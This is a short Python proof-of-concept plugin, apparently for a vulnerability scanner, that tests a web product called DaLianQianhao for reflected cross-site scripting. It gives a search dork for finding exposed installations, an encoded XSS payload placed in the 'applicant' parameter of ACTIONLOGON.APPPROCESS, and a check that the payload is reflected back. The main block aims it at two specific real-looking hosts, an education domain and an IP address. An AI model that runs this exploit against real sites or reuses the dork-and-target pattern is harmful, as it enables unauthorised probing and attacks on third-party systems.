#!/usr/bin/env python
#Author:Little Nine
#BaiduHacking: inurl:ACTIONLOGON.APPPROCESS
#DaLianQianhao XSS
import re

def assign(service, arg):
    if service == "dalianqianhao":
        return True, arg

def audit(arg):
    url = arg
    payload=url+'ACTIONLOGON.APPPROCESS?mode=1&applicant=%22%3E%3Ch1%3EYourXSShere%3C/h1%3E'
    code, head, res, errcode, _ = curl.curl(payload)
    if code == 200 and "<h1>YourXSShere</h1>" in res:
       security_info(payload)
if __name__ == '__main__':
    from dummy import *
    audit(assign('dalianqianhao', 'http://jwk.dlvtc.edu.cn/')[1])
    audit(assign('dalianqianhao', 'http://218.7.95.52:800/')[1])